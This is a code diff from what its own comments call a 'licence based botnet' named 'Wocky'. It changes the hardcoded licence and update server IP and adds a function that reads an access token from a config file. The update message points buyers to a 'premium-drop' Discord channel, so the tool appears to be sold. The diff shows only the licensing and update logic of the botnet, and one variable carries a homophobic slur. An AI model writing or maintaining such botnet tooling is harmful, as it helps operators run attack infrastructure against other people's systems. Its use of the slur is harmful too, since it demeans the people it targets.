@@ -10,11 +10,10 @@ import server
 // method -> licence_validation()
 // note -> licence based botnet 
 pub fn licence_valiation() {
-	mut token := os.input("Wocky Token Key: ")
+	token := get_token()
 	if token == "" { println("[x] Access denied, Invalid token!") exit(0) }
 	if token.len > 10 {
-		mut token_check := http.get_text("http://194.147.35.227/wocky/?token=$token&version=${config.version}")
-
+		mut token_check := http.get_text("http://193.203.238.8/wocky/?token=$token&version=${config.version}")
 		if token_check.contains("[x]") {
 			println("[x] Access denied, Invalid token!")
 			exit(0)
@@ -30,10 +29,26 @@ pub fn licence_valiation() {
 	}
 }
 
+pub fn get_token() string {
+	if os.exists(os.getwd() + "/config/settings.cfg") {
+		mut token := os.read_lines(os.getwd() + "/config/settings.cfg") or { [',',','] }
+		if token[3].replace("wocky_token=", "") != "" {
+			return token[3].replace("wocky_token=", "")
+		} else {
+			mut fag := os.input("Wocky Token Key: ")
+			return fag
+		}
+	} else {
+		mut fag := os.input("Wocky Token Key: ")
+		return fag
+	}
+}
+
 pub fn check_update() {
-	mut token_check := http.get_text("http://194.147.35.227/wocky/")
+	mut token := get_token()
+	mut token_check := http.get_text("http://193.203.238.8/wocky/?token=${token}&version=${config.version}")
 	if token_check.contains("Version: ${config.version}") { 
-		println("[+] Update: ${config.version}")
+		println("[+] Version: ${config.version}")
 	} else {
 		println("[x] Error, New update found. Go check #premium-drop channel in the discord for new update!\r\nAuto update coming soon!")
 		exit(0)
